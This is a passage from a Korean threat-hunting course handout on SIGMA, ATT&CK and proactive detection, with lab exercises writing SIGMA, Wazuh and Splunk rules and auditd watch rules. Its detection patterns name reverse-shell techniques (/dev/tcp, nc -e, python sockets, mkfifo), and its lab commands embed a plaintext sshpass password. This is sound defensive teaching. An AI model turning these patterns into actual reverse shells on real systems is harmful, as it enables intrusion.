# Week 08: 위협 헌팅 -- SIGMA, ATT&CK, 프로액티브 탐지

## 학습 목표

- 위협 헌팅(Threat Hunting)의 정의, 반응형 탐지와의 차이, Hunting Maturity Model(HMM)을 체계적으로 이해한다
- 가설 기반 헌팅(Hypothesis-Driven Hunting) 방법론을 습득하고 IOC와 IOA의 차이를 명확히 구분한다
- SIGMA 룰의 문법을 이해하고, sigmac/sigma-cli로 Wazuh/Splunk용 규칙을 변환할 수 있다
- MITRE ATT&CK Navigator를 활용하여 기법별 탐지 쿼리를 작성하고 베이스라인 이탈을 탐지할 수 있다
- Wazuh 커스텀 디코더/룰과 YARA 룰을 작성하여 프로액티브 탐지 워크플로우를 구축할 수 있다
- OpsClaw 플랫폼을 활용한 자동화 헌팅 파이프라인을 구성하고 운용할 수 있다

## 선수 지식

- 공방전 기초 과정(Course 11) 이수 또는 동등 수준
- Week 06(방어 전략) / Week 07(포렌식) 내용 숙지
- Linux 명령줄 및 SIEM 로그 쿼리 기본 역량
- YAML/XML 문법 기초 이해

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 헌팅 워크스테이션 (분석/오케스트레이션) | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | nftables + Suricata IPS 로그 소스 | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | BunkerWeb WAF + JuiceShop 공격 대상 | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | Wazuh 4.11.2 SIEM 중앙 로그 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (4시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:50 | Part 1: 위협 헌팅 이론 | 강의 + 토론 |
| 0:50-1:00 | 휴식 | - |
| 1:00-1:50 | Part 2: SIGMA 룰 작성 및 변환 실습 | 실습 |
| 1:50-2:00 | 휴식 | - |
| 2:00-2:50 | Part 3: ATT&CK 기반 가설 헌팅 | 실습 |
| 2:50-3:00 | 휴식 | - |
| 3:00-3:50 | Part 4: 프로액티브 탐지 + YARA | 실습 |
| 3:50-4:00 | 체크리스트 점검 + 퀴즈 + 과제 안내 | 정리 |

---

# Part 1: 위협 헌팅 이론 -- 정의, Hunting Maturity Model, 가설 기반 헌팅, IOC/IOA 차이 (50분)

## 1.1 위협 헌팅의 정의

위협 헌팅(Threat Hunting)이란, 기존 보안 도구(IDS, SIEM 룰, AV 시그니처)가 자동으로 탐지하지 못한 위협을 **사람이 주도적으로 찾아내는 프로액티브 보안 활동**이다. 전통적인 반응형(Reactive) 보안이 "알림이 울리면 대응"하는 패턴이라면, 위협 헌팅은 "알림이 울리지 않았지만 위협이 존재할 수 있다"는 전제에서 출발한다.

SANS 연구소의 정의에 따르면, 위협 헌팅은 "자동화된 보안 도구를 우회한 고급 위협을 식별하기 위해 네트워크와 엔드포인트를 반복적으로(iteratively) 탐색하는 프로세스"이다. 이 정의의 핵심 키워드 세 가지를 분리해 보자.

**첫째, "자동화된 도구를 우회한"**: IDS/IPS 시그니처, SIEM 상관분석 룰, 안티바이러스 패턴이 이미 잡아내는 것은 헌팅 대상이 아니다. 헌팅은 이미 존재하는 탐지 체계의 사각지대(blind spot)를 찾아내는 것이다.

**둘째, "반복적으로(iteratively)"**: 위협 헌팅은 일회성 이벤트가 아니라 지속적이고 반복적인 사이클이다. 가설 수립 -> 데이터 수집 -> 분석 -> 결과 평가 -> 탐지 규칙 생성 -> 다음 가설 수립의 순환 구조를 갖는다.

**셋째, "네트워크와 엔드포인트를"**: 헌팅의 데이터 소스는 네트워크 트래픽, 시스템 로그, 프로세스 목록, 파일 시스템, 메모리 덤프 등 가용한 모든 텔레메트리를 포괄한다.

### 반응형 탐지 vs 위협 헌팅 비교

| 특성 | 반응형 탐지 (IDS/SIEM Alert) | 위협 헌팅 (Proactive Hunting) |
|------|---------------------------|------------------------------|
| 접근 방식 | 알림 기반, 수동적 대기 | 가설 기반, 능동적 탐색 |
| 출발점 | 시그니처/룰 매칭 결과 | TTP 가설 + 위협 인텔리전스 |
| 탐지 범위 | 알려진 위협(Known Threats) | 미지의 위협(Unknown Threats) |
| 분석 빈도 | 실시간 자동 | 주기적 또는 이벤트 트리거 |
| 결과물 | 알림(Alert) | 새로운 탐지 규칙 + 위협 보고서 |
| 필요 역량 | 룰 작성, 알림 분류 | 위협 인텔, 데이터 분석, TTP 이해 |
| 자동화 수준 | 높음 (도구 의존) | 중간 (사람 주도, 도구 보조) |
| 오탐 처리 | 알림 튜닝 | 가설 수정 및 컨텍스트 확인 |

### 위협 헌팅의 3가지 유형

1. **구조화된 헌팅(Structured Hunting)**: MITRE ATT&CK 프레임워크의 특정 기법(Technique)이나 전술(Tactic)을 기반으로 가설을 세우고, 해당 기법의 흔적을 체계적으로 검색한다. 예를 들어 "T1053.003(Cron Job) 기법을 이용한 지속성 확보가 있었는가?"라는 가설을 검증한다.

2. **비구조화된 헌팅(Unstructured Hunting)**: 특정 IOC(Indicator of Compromise), 이상 징후, 또는 위협 인텔리전스 보고서를 출발점으로 삼아 자유롭게 탐색한다. "어제 공유된 APT 보고서의 C2 도메인이 우리 DNS 로그에 있는가?"처럼 시작점은 있지만 탐색 경로가 열려 있다.

3. **상황 기반 헌팅(Situational Hunting)**: 조직 내부의 상황 변화(신규 시스템 도입, 인수합병, 주요 취약점 공개)를 트리거로 해당 영역에 집중하여 헌팅한다. "Log4Shell 공개 후 우리 Java 애플리케이션에서 JNDI 룩업 시도가 있었는가?"가 예시다.

## 1.2 위협 헌팅 프로세스 (Hunting Cycle)

위협 헌팅은 다음 5단계의 반복 순환 구조를 따른다.

```
    +-------------+
    |  1. 가설 수립  |
    +------+------+
           |
    +------v------+
    | 2. 데이터 수집 |
    +------+------+
           |
    +------v------+
    | 3. 분석 실행  |
    +------+------+
           |
    +------v------+
    | 4. 결과 평가  |
    +------+------+
           |
    +------v------+
    | 5. 규칙 생성  |----> 다음 사이클로 피드백
    +-------------+
```

**1단계 -- 가설 수립(Hypothesis Generation)**

- 위협 인텔리전스 보고서, ATT&CK 매트릭스, 과거 인시던트 분석 결과를 바탕으로 검증 가능한 가설을 수립한다.
- 좋은 가설의 조건: (1) 구체적이고 측정 가능, (2) 데이터로 검증 가능, (3) 위험도 우선순위에 부합.
- 예시: "공격자가 web 서버에서 T1059.004(Unix Shell)를 이용하여 리버스 쉘을 실행했을 수 있다."

**2단계 -- 데이터 수집(Data Collection)**

- 가설 검증에 필요한 로그/텔레메트리를 식별하고 수집한다.
- 데이터 소스 예시: Wazuh 에이전트 로그, auditd 감사 로그, Suricata 네트워크 로그, syslog, 프로세스 트리, 파일 해시 등.
- 데이터 갭 분석: 가설 검증에 필요한 데이터가 수집되지 않고 있다면, 해당 텔레메트리 수집을 먼저 활성화해야 한다.

**3단계 -- 분석 실행(Analysis)**

- SIGMA 룰, 커스텀 쿼리, 통계 분석, 스택 분석(stacking), 클러스터링 등 다양한 기법을 적용한다.
- 주요 분석 기법: 빈도 분석(frequency), 롱테일 분석(long-tail), 베이스라인 이탈 탐지, 상관분석(correlation).

**4단계 -- 결과 평가(Evaluation)**

- 발견된 이상 징후가 참양성(True Positive)인지 거짓양성(False Positive)인지 분류한다.
- 참양성이면 인시던트 대응(IR) 프로세스로 에스컬레이션한다.
- 거짓양성이면 가설을 수정하거나 분석 기법을 조정한다.

**5단계 -- 규칙 생성(Detection Engineering)**

- 헌팅에서 발견된 TTP를 SIGMA 룰, Wazuh 커스텀 룰, YARA 룰 등 자동 탐지 규칙으로 변환한다.
- 이 규칙은 기존 탐지 체계에 반영되어 사각지대를 줄인다.
- 다음 헌팅 사이클의 가설 수립에 현재 결과를 피드백한다.

## 1.3 Hunting Maturity Model (HMM)

David Bianco가 제안한 Hunting Maturity Model은 조직의 헌팅 성숙도를 5단계로 분류한다. 각 단계의 특징과 필요 역량을 상세히 살펴보자.

| 레벨 | 이름 | 설명 | 주요 활동 | 필요 역량 |
|------|------|------|----------|----------|
| HM0 | Initial | 자동 알림에만 의존, 헌팅 개념 없음 | SIEM 알림 대응만 수행 | 기본 알림 처리 |
| HM1 | Minimal | IOC 검색 수행 가능 | 위협 인텔 IOC를 로그에서 검색 | IOC 피드 활용, 기본 검색 쿼리 |
| HM2 | Procedural | 문서화된 절차 기반 헌팅 | 타인이 만든 헌팅 절차를 따라 실행 | SIGMA 룰 적용, ATT&CK 기본 이해 |
| HM3 | Innovative | 가설 기반 자체 헌팅 수행 | 독자적 가설 수립 + 검증 + 새 룰 생성 | TTP 분석, 데이터 과학, 규칙 작성 |
| HM4 | Leading | 자동화 + ML 기반 고도화 | 헌팅 파이프라인 자동화, 이상 탐지 모델 | 머신러닝, 대규모 데이터 분석, 자동화 |

대부분의 조직은 HM0~HM1 수준에 머물러 있다. 본 교육은 수강자를 HM2~HM3 수준으로 끌어올리는 것을 목표로 한다. OpsClaw 플랫폼을 활용한 자동화 파이프라인은 HM4를 향한 실질적 발판이 된다.

## 1.4 IOC vs IOA -- 근본적 차이

위협 헌팅에서 가장 중요한 개념적 구분 중 하나는 IOC(Indicator of Compromise)와 IOA(Indicator of Attack)의 차이이다.

### IOC (Indicator of Compromise) -- 침해 지표

IOC는 이미 발생한 침해의 **결과물**이다. 공격이 성공한 후 남긴 아티팩트(artifact)로서, 사후(post-compromise) 탐지에 주로 활용된다.

- **IP 주소**: 알려진 C2(Command & Control) 서버 IP (예: 198.51.100.23)
- **도메인**: 악성 도메인 (예: evil-c2.example.com)
- **파일 해시**: 악성코드 해시 (SHA256, MD5)
- **레지스트리 키**: 악성코드가 생성한 지속성 레지스트리 항목
- **파일 경로**: 악성코드 드롭 경로 (예: /tmp/.hidden_backdoor)
- **이메일 발신자**: 피싱 메일의 발신 주소

IOC의 한계: 공격자가 IOC를 쉽게 변경할 수 있다(IP 교체, 해시 변경, 도메인 교체). David Bianco의 "Pyramid of Pain"에서 해시, IP, 도메인은 피라미드 하단에 위치하며 공격자가 가장 쉽게 바꿀 수 있는 지표이다.

### IOA (Indicator of Attack) -- 공격 지표

IOA는 공격 **행위 자체**의 패턴이다. 공격이 진행 중이거나 시도되는 **과정**에서 나타나는 행동 기반 지표로서, 실시간(real-time) 또는 근실시간 탐지에 활용된다.

- **프로세스 체인 이상**: bash가 python을 스폰하고, python이 /dev/tcp로 네트워크 연결을 시도하는 패턴
- **비정상 명령 실행 순서**: whoami -> id -> cat /etc/passwd -> uname -a (정찰 패턴)
- **권한 상승 시도**: 일반 사용자가 sudo를 반복 실행하거나 SUID 바이너리를 탐색
- **횡이동 패턴**: 한 호스트에서 내부 다수 호스트로 SSH 연결 시도
- **데이터 반출 패턴**: 대량 데이터를 외부 IP로 전송하는 행위

IOA의 장점: 공격자가 도구(tool)를 바꿔도 행위(behavior)는 유사하므로, TTP(Tactics, Techniques, Procedures) 수준의 탐지가 가능하다. Pyramid of Pain의 최상단인 TTPs를 탐지하면 공격자는 전략 자체를 변경해야 하므로 방어 효과가 극대화된다.

### 실전 비교 시나리오

| 상황 | IOC 접근 | IOA 접근 |
|------|---------|---------|
| 리버스 쉘 탐지 | 알려진 C2 IP 목록과 비교 | bash에서 /dev/tcp 또는 nc -e 호출 패턴 탐지 |
| 크립토마이너 탐지 | 알려진 마이닝 풀 도메인/IP 차단 | CPU 사용률 급등 + 외부 연결 패턴 탐지 |
| 웹쉘 탐지 | 알려진 웹쉘 파일 해시 비교 | 웹 프로세스에서 쉘 명령 스폰 패턴 탐지 |
| 데이터 반출 탐지 | 알려진 파일 공유 서비스 IP 차단 | 비정상 대용량 아웃바운드 트래픽 패턴 탐지 |

**핵심 원칙**: 효과적인 위협 헌팅은 IOC와 IOA를 모두 활용하되, IOA 기반의 행동 탐지에 더 높은 비중을 둔다. IOC는 빠른 초기 스크리닝에, IOA는 정밀한 행위 기반 헌팅에 각각 활용한다.

## 1.5 위협 인텔리전스와 헌팅의 연계

위협 헌팅의 가설 수립에는 다양한 위협 인텔리전스 소스가 활용된다.

| 인텔리전스 유형 | 소스 예시 | 헌팅 활용 |
|---------------|----------|----------|
| 전략적 인텔 | APT 그룹 보고서 | 우선 탐지 대상 TTP 결정 |
| 전술적 인텔 | MITRE ATT&CK | 가설 수립 프레임워크 |
| 운용적 인텔 | 취약점 공개(CVE) | 상황 기반 헌팅 트리거 |
| 기술적 인텔 | IOC 피드(STIX/TAXII) | IOC 스크리닝 자동화 |

---

# Part 2: SIGMA 룰 -- 문법, 작성법, sigmac 변환(Wazuh/Splunk), 커스텀 룰 실습 (50분)

## 2.1 SIGMA란?

SIGMA는 Florian Roth(Neo23x0)가 만든, SIEM 제품에 독립적인(vendor-agnostic) **표준 탐지 규칙 형식**이다. Snort/Suricata가 네트워크 IDS의 표준 시그니처 형식이듯, SIGMA는 로그 기반 탐지의 표준 형식을 지향한다. YAML로 작성하며, sigma-cli(구 sigmac)를 통해 Splunk SPL, Elastic KQL, Wazuh XML, QRadar AQL 등 다양한 SIEM 쿼리로 변환할 수 있다.

### SIGMA의 장점

1. **이식성(Portability)**: 한 번 작성한 룰을 여러 SIEM 제품에서 사용할 수 있다
2. **커뮤니티**: SigmaHQ GitHub에 3,000개 이상의 검증된 탐지 룰이 공개되어 있다
3. **표준화**: 팀 간, 조직 간 탐지 규칙 공유의 공통 언어를 제공한다
4. **버전 관리**: YAML 텍스트 파일이므로 Git으로 변경 이력을 추적할 수 있다

### SIGMA 룰 구조 해부

```yaml
title: 룰의 제목 (간결하고 설명적)
id: UUID (고유 식별자)
related:
  - id: 관련_룰_UUID
    type: derived    # derived | obsoletes | merged | renamed | similar
status: experimental # test | stable | experimental | deprecated | unsupported
description: 룰에 대한 상세 설명
author: 작성자
date: 작성일 (YYYY/MM/DD)
modified: 수정일
references:
  - https://attack.mitre.org/techniques/TXXXX/
tags:
  - attack.tactic_name      # ATT&CK 전술
  - attack.tXXXX.XXX        # ATT&CK 기법
  - cve.YYYY.NNNNN          # 관련 CVE
logsource:
  category: process_creation  # 로그 카테고리
  product: linux              # 제품 (linux, windows, ...)
  service: auditd             # 서비스 (syslog, auditd, ...)
detection:
  selection:                  # 매칭 조건 (AND 결합)
    field1: value1
    field2|modifier: value2
  filter:                     # 제외 조건
    field3: excluded_value
  condition: selection and not filter   # 논리식
falsepositives:
  - 정상적 상황에서의 오탐 가능 시나리오
level: high  # informational | low | medium | high | critical
```

### SIGMA 검색 수정자(Modifiers)

SIGMA는 필드 값 매칭 시 다양한 수정자를 지원한다.

| 수정자 | 의미 | 예시 |
|--------|------|------|
| `contains` | 부분 문자열 매칭 | `CommandLine\|contains: '-enc'` |
| `startswith` | 접두사 매칭 | `Image\|startswith: '/tmp/'` |
| `endswith` | 접미사 매칭 | `TargetFilename\|endswith: '.php'` |
| `re` | 정규표현식 | `CommandLine\|re: 'curl.*\|bash'` |
| `all` | 리스트 값 모두 AND | `CommandLine\|contains\|all:` |
| `base64` | Base64 인코딩 값 매칭 | `CommandLine\|base64\|contains: 'password'` |
| `cidr` | CIDR 범위 매칭 | `DestinationIp\|cidr: '10.0.0.0/8'` |

### 조건식(condition) 논리

condition 필드에서 사용 가능한 논리 연산자:

- `and` -- 두 조건 모두 참
- `or` -- 하나 이상 참
- `not` -- 부정
- `1 of selection*` -- selection으로 시작하는 검색 식별자 중 하나 이상 매칭
- `all of selection*` -- selection으로 시작하는 검색 식별자 모두 매칭
- `1 of them` -- 모든 검색 식별자 중 하나 이상

## 실습 2.1: SIGMA 룰 작성 -- 리버스 쉘 탐지

> **실습 목적**: 리버스 쉘 실행을 탐지하는 SIGMA 룰을 작성하여, 행위 기반(IOA) 탐지의 원리를 체득한다.
>
> **배우는 것**: SIGMA 문법, logsource/detection/condition 구조, 수정자 활용, ATT&CK 태그 매핑
>
> **결과 해석**: 룰이 auditd 로그에서 bash/sh 프로세스의 /dev/tcp 또는 nc -e 호출 패턴을 포착한다. 이 패턴은 공격자가 리버스 쉘을 열 때 거의 항상 사용하는 행위이므로 IOA 기반 탐지에 해당한다.
>
> **실전 활용**: 이 룰은 모든 Linux 서버에 배포하여 리버스 쉘 시도를 실시간으로 탐지하는 데 사용할 수 있다. 오탐을 줄이기 위해 filter 섹션에 정상적인 관리 스크립트 경로를 제외 조건으로 추가한다.

```bash
# opsclaw 워크스테이션에서 실행
mkdir -p /tmp/sigma_hunt && cd /tmp/sigma_hunt

# SIGMA 룰 파일 생성: 리버스 쉘 탐지
cat > reverse_shell_detection.yml << 'SIGMA_EOF'
title: Linux Reverse Shell Execution
id: f47ac10b-58cc-4372-a567-0e02b2c3d479
status: experimental
description: |
  bash, sh, python, perl, nc 등을 이용한 리버스 쉘 실행을 탐지한다.
  공격자가 초기 접근 후 인터랙티브 쉘을 확보하려는 시도를 포착하는 IOA 기반 룰이다.
author: OpsClaw Threat Hunting Team
date: 2026/04/03
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1071/001/
tags:
  - attack.execution
  - attack.t1059.004
  - attack.command_and_control
  - attack.t1071.001
logsource:
  category: process_creation
  product: linux
detection:
  selection_bash_revshell:
    CommandLine|contains:
      - '/dev/tcp/'
      - '/dev/udp/'
  selection_nc_revshell:
    CommandLine|contains|all:
      - 'nc'
      - '-e'
  selection_python_revshell:
    CommandLine|contains|all:
      - 'python'
      - 'socket'
      - 'connect'
  selection_perl_revshell:
    CommandLine|contains|all:
      - 'perl'
      - 'socket'
      - 'Socket'
  selection_mkfifo:
    CommandLine|contains|all:
      - 'mkfifo'
      - '/bin/sh'
  filter_legitimate:
    User:
      - 'root'
    ParentImage|endswith:
      - '/ansible'
      - '/puppet'
  condition: (1 of selection_*) and not filter_legitimate
falsepositives:
  - 네트워크 테스트를 위한 정상적 nc(netcat) 사용
  - 자동화 도구(Ansible 등)에서의 원격 실행
  - 개발 환경에서의 소켓 통신 테스트
level: critical
SIGMA_EOF

echo "[+] SIGMA 룰 생성 완료"
cat reverse_shell_detection.yml
```

> **명령어 해설**:
> - `mkdir -p /tmp/sigma_hunt`: 작업 디렉토리를 생성한다. `-p` 옵션으로 이미 존재해도 오류 없이 진행한다.
> - `cat > ... << 'SIGMA_EOF'`: Heredoc 구문으로 여러 줄의 YAML 내용을 파일에 기록한다. 따옴표로 감싼 `'SIGMA_EOF'`는 변수 치환을 방지한다.
> - `1 of selection_*`: SIGMA 조건식으로, `selection_`으로 시작하는 모든 검색 블록 중 하나라도 매칭되면 참이다.

> **트러블슈팅**:
> - YAML 파싱 에러 발생 시: 들여쓰기가 스페이스 2칸인지 확인한다. 탭 문자는 YAML에서 허용되지 않는다.
> - `|contains|all` 조합이 동작하지 않으면: sigma-cli 버전이 0.7 이상인지 확인한다. 구버전에서는 일부 수정자 조합이 미지원이다.

## 실습 2.2: SIGMA 룰 작성 -- crontab 지속성 탐지

> **실습 목적**: 공격자가 crontab을 이용한 지속성(Persistence) 확보를 탐지하는 룰을 작성한다.
>
> **배우는 것**: auditd 로그소스 활용, 파일 시스템 이벤트 기반 탐지, ATT&CK T1053.003 매핑
>
> **결과 해석**: auditd가 crontab 관련 파일 수정(rename, write)을 감사할 때, 이 룰이 비인가 cron 작업 변경을 포착한다.
>
> **실전 활용**: 프로덕션 서버에서 승인되지 않은 cron 작업 추가를 실시간으로 감지하여 지속성 설치 시도를 조기에 차단한다.

```bash
# SIGMA 룰: crontab 수정을 통한 지속성 탐지
cat > crontab_persistence.yml << 'SIGMA_EOF'
title: Suspicious Crontab Modification for Persistence
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: |
  crontab 파일의 비인가 수정을 탐지한다. 공격자가 T1053.003(Cron) 기법으로
  지속성을 확보하려는 시도를 포착하는 데 사용한다.
author: OpsClaw Threat Hunting Team
date: 2026/04/03
references:
  - https://attack.mitre.org/techniques/T1053/003/
tags:
  - attack.persistence
  - attack.t1053.003
logsource:
  product: linux
  service: auditd
detection:
  selection_crontab_cmd:
    type: SYSCALL
    syscall:
      - rename
      - unlink
      - open
    key: crontab_mod
  selection_crontab_file:
    type: PATH
    name|contains:
      - '/var/spool/cron'
      - '/etc/cron.d'
      - '/etc/crontab'
  selection_crontab_edit:
    type: EXECVE
    a0|endswith: 'crontab'
    a1: '-e'
  filter_system_users:
    uid:
      - '0'
    auid:
      - '0'
      - '4294967295'
  condition: (1 of selection_*) and not filter_system_users
falsepositives:
  - 시스템 관리자의 정상적인 cron 작업 변경
  - 패키지 설치/업데이트 시 cron 작업 자동 추가
  - 구성 관리 도구(Ansible, Chef)의 cron 모듈 실행
level: high
SIGMA_EOF

echo "[+] crontab persistence SIGMA 룰 생성 완료"
```

> **명령어 해설**:
> - `syscall: rename | unlink | open`: crontab 파일에 대한 이름 변경, 삭제, 열기 시스템 콜을 감시한다.
> - `key: crontab_mod`: auditd 룰에서 설정한 감시 키와 매칭한다. `auditctl -w /var/spool/cron -p wa -k crontab_mod` 명령으로 사전에 감시를 설정해야 한다.
> - `auid: '4294967295'`: auditd에서 로그인 UID가 설정되지 않은 경우(시스템 프로세스)를 나타내는 값이다.

## 실습 2.3: sigma-cli를 이용한 Wazuh/Splunk 변환

> **실습 목적**: 작성한 SIGMA 룰을 sigma-cli 도구로 Wazuh XML 규칙과 Splunk SPL 쿼리로 변환한다.
>
> **배우는 것**: 크로스 플랫폼 탐지 규칙 관리, sigma-cli 파이프라인 개념, 수동 변환 방법
>
> **결과 해석**: 변환된 출력이 대상 SIEM의 쿼리 문법에 맞는지 검증한다. 자동 변환이 완벽하지 않은 경우 수동 보정이 필요한 부분을 식별한다.
>
> **실전 활용**: 탐지 엔지니어링 파이프라인에서 SIGMA 룰을 단일 진실 소스(Single Source of Truth)로 관리하고, CI/CD에서 자동 변환 및 배포한다.

```bash
# sigma-cli 설치 (Python 가상환경 권장)
pip3 install sigma-cli pySigma-backend-splunk pySigma-backend-elasticsearch \
  pySigma-pipeline-sysmon pySigma-pipeline-linux 2>/dev/null

# Splunk SPL로 변환
echo "=== Splunk SPL 변환 ==="
sigma convert -t splunk -p sysmon reverse_shell_detection.yml 2>/dev/null || \
  echo "[!] sigma-cli 미설치 시 수동 변환 참조"

# Elasticsearch/OpenSearch 쿼리로 변환
echo ""
echo "=== Elasticsearch 변환 ==="
sigma convert -t elasticsearch reverse_shell_detection.yml 2>/dev/null || \
  echo "[!] sigma-cli 미설치 시 수동 변환 참조"
```

```bash
# sigma-cli가 없는 환경을 위한 수동 Wazuh XML 변환
echo "=== 수동 Wazuh XML 변환 ==="

cat > /tmp/sigma_hunt/wazuh_reverse_shell.xml << 'WAZUH_EOF'
<!-- SIGMA 룰 reverse_shell_detection.yml의 Wazuh XML 수동 변환 -->
<group name="sigma,threat_hunting,reverse_shell">

  <!-- 룰 1: bash /dev/tcp 리버스 쉘 탐지 -->
  <rule id="100401" level="14">
    <decoded_as>auditd</decoded_as>
    <field name="audit.execve.a0">bash|sh</field>
    <regex type="pcre2">\/dev\/tcp\/|\/dev\/udp\/</regex>
    <description>SIGMA: Reverse shell via /dev/tcp detected (T1059.004)</description>
    <group>sigma,attack.execution,T1059.004</group>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>

  <!-- 룰 2: nc -e 리버스 쉘 탐지 -->
  <rule id="100402" level="14">
    <decoded_as>auditd</decoded_as>
    <field name="audit.execve.a0">nc|ncat|netcat</field>
    <field name="audit.execve.a1">-e</field>
    <description>SIGMA: Reverse shell via netcat -e detected (T1059.004)</description>
    <group>sigma,attack.execution,T1059.004</group>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>

  <!-- 룰 3: python 소켓 리버스 쉘 탐지 -->
  <rule id="100403" level="14">
    <decoded_as>auditd</decoded_as>
    <field name="audit.execve.a0">python|python3</field>
    <regex type="pcre2">socket.*connect|import\s+socket</regex>
    <description>SIGMA: Reverse shell via Python socket detected (T1059.004)</description>
    <group>sigma,attack.execution,T1059.004</group>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>

  <!-- 룰 4: mkfifo 기반 리버스 쉘 탐지 -->
  <rule id="100404" level="14">
    <decoded_as>auditd</decoded_as>
    <regex type="pcre2">mkfifo.*\/bin\/sh|\/bin\/sh.*mkfifo</regex>
    <description>SIGMA: Reverse shell via mkfifo pipe detected (T1059.004)</description>
    <group>sigma,attack.execution,T1059.004</group>
    <mitre>
      <id>T1059.004</id>
    </mitre>
  </rule>

</group>
WAZUH_EOF

echo "[+] Wazuh XML 변환 파일: /tmp/sigma_hunt/wazuh_reverse_shell.xml"
cat /tmp/sigma_hunt/wazuh_reverse_shell.xml
```

```bash
# Splunk SPL 수동 변환 참고
echo "=== Splunk SPL 수동 변환 ==="
cat << 'SPL_EOF'
# SIGMA reverse_shell_detection.yml -> Splunk SPL

index=linux sourcetype=auditd
(
  (CommandLine="*/dev/tcp/*" OR CommandLine="*/dev/udp/*")
  OR (CommandLine="*nc*" AND CommandLine="*-e*")
  OR (CommandLine="*python*" AND CommandLine="*socket*" AND CommandLine="*connect*")
  OR (CommandLine="*perl*" AND CommandLine="*socket*" AND CommandLine="*Socket*")
  OR (CommandLine="*mkfifo*" AND CommandLine="*/bin/sh*")
)
NOT (User="root" AND (ParentImage="*/ansible" OR ParentImage="*/puppet"))
| stats count by _time, host, User, CommandLine
| sort -_time
SPL_EOF
```

> **명령어 해설**:
> - `sigma convert -t splunk -p sysmon`: `-t`는 대상 백엔드(splunk), `-p`는 파이프라인(sysmon 필드 매핑)을 지정한다.
> - Wazuh XML에서 `<regex type="pcre2">`: Wazuh 4.x는 PCRE2 정규표현식을 지원한다. `pcre2` 타입을 명시하면 Perl 호환 정규식을 사용할 수 있다.
> - Splunk SPL에서 `| stats count by ...`: 매칭된 이벤트를 호스트/사용자/명령줄별로 집계하여 분석한다.

> **트러블슈팅**:
> - `sigma convert` 실행 시 `No pipeline for backend` 오류: `pySigma-pipeline-*` 패키지가 설치되지 않은 경우이다. `pip3 install pySigma-pipeline-sysmon`으로 해결한다.
> - Wazuh XML 룰 적용 후 탐지가 안 되는 경우: (1) auditd 감사 규칙이 먼저 설정되어 있는지 확인, (2) Wazuh 에이전트에서 auditd 로그 수집이 활성화되어 있는지 확인한다.
> - 자동 변환 결과가 부정확한 경우: SIGMA의 logsource 필드 매핑이 대상 SIEM과 일치하지 않을 수 있다. 수동 보정이 필요하다.

## 실습 2.4: auditd 감시 규칙 설정 (SIGMA 룰의 전제 조건)

> **실습 목적**: SIGMA 룰이 동작하기 위한 전제 조건인 auditd 감시 규칙을 설정한다.
>
> **배우는 것**: auditd 아키텍처, 감시 규칙 문법, 필수 텔레메트리 확보 방법

```bash
# web 서버에서 auditd 감시 규칙 설정
sshpass -p1 ssh web@10.20.30.80 << 'REMOTE_EOF'
# auditd 상태 확인
echo "=== auditd 상태 ==="
sudo auditctl -s

# 위협 헌팅용 감시 규칙 추가
echo "=== 감시 규칙 추가 ==="

# crontab 파일 감시 (T1053.003)
sudo auditctl -w /var/spool/cron -p wa -k crontab_mod
sudo auditctl -w /etc/cron.d -p wa -k crontab_mod
sudo auditctl -w /etc/crontab -p wa -k crontab_mod

# systemd 서비스 파일 감시 (T1543.002)
sudo auditctl -w /etc/systemd/system -p wa -k systemd_mod
sudo auditctl -w /usr/lib/systemd/system -p wa -k systemd_mod

# 실행 파일 감시 -- 의심 경로 (T1059)
sudo auditctl -w /tmp -p x -k tmp_exec
sudo auditctl -w /dev/shm -p x -k shm_exec

# 패스워드 파일 접근 감시 (T1003)
sudo auditctl -w /etc/shadow -p r -k shadow_read
sudo auditctl -w /etc/passwd -p r -k passwd_read

# 설정된 규칙 확인
echo "=== 현재 감시 규칙 목록 ==="
sudo auditctl -l
REMOTE_EOF
```

> **명령어 해설**:
> - `auditctl -w /var/spool/cron -p wa -k crontab_mod`: `/var/spool/cron` 경로에 대해 쓰기(w)와 속성 변경(a)을 감시하고, `crontab_mod` 키를 태그한다.
> - `-p x`: 실행(execute) 권한 사용을 감시한다. `/tmp`에서의 실행은 비정상일 가능성이 높다.
> - `-p r`: 읽기(read) 접근을 감시한다. `/etc/shadow` 읽기는 자격 증명 탈취 시도일 수 있다.
> - `-k` 옵션의 키 값은 SIGMA 룰의 `key` 필드와 매칭되어야 한다.

---

# Part 3: ATT&CK 기반 헌팅 -- Navigator 매핑, 기법별 탐지 쿼리, 베이스라인 이탈 탐지 (50분)

## 3.1 MITRE ATT&CK과 위협 헌팅

MITRE ATT&CK(Adversarial Tactics, Techniques, and Common Knowledge)은 실제 관찰된 공격자 행동을 체계적으로 분류한 지식 기반이다. 위협 헌팅에서 ATT&CK은 다음 세 가지 역할을 한다.

1. **가설 수립의 프레임워크**: 탐지해야 할 TTP 목록을 체계적으로 제공한다
2. **커버리지 평가**: 현재 탐지 체계가 어떤 기법을 탐지하고, 어떤 기법에 사각지대가 있는지 시각화한다
3. **우선순위 결정**: 위협 인텔리전스와 연계하여 우리 조직에 가장 위험한 기법부터 헌팅한다

### ATT&CK Navigator

ATT&CK Navigator는 ATT&CK 매트릭스를 시각적으로 매핑하는 웹 도구이다. 각 기법의 탐지 커버리지를 색상으로 표시하여, 어떤 기법에 대한 헌팅이 필요한지 한눈에 파악할 수 있다.

- **빨간색**: 탐지 규칙 없음 (헌팅 우선순위 높음)
- **노란색**: 부분 탐지 (헌팅으로 보강 필요)
- **녹색**: 충분한 탐지 규칙 존재

### 본 실습에서 다루는 ATT&CK 기법

| 전술 | 기법 ID | 기법명 | 헌팅 우선순위 |
|------|---------|--------|-------------|
| Persistence | T1053.003 | Scheduled Task/Job: Cron | 높음 |
| Persistence | T1543.002 | Create/Modify System Process: Systemd | 높음 |
| Execution | T1059.004 | Command and Scripting: Unix Shell | 매우 높음 |
